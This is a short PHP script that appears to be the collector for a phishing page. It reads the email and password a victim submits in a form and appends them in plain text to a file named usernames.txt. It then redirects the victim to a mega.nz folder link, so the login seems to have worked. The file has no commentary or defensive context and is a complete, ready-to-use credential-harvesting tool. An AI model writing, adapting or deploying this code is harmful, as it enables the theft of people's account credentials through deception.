<?php

file_put_contents("usernames.txt", "Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://mega.nz/folder/vIY0BKxC#9U-t5sE1KRmaxSswWN-gAw');
exit();
